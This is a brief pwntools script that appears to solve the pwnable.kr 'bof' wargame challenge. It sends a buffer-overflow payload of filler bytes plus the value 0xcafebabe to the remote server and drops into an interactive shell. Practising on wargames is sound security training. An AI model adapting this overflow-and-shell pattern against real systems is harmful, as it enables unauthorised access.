from pwn import *

p = remote('pwnable.kr', 9000)
payload = b'A'*0x34 + p32(0xcafebabe)
p.sendline(payload)
p.interactive()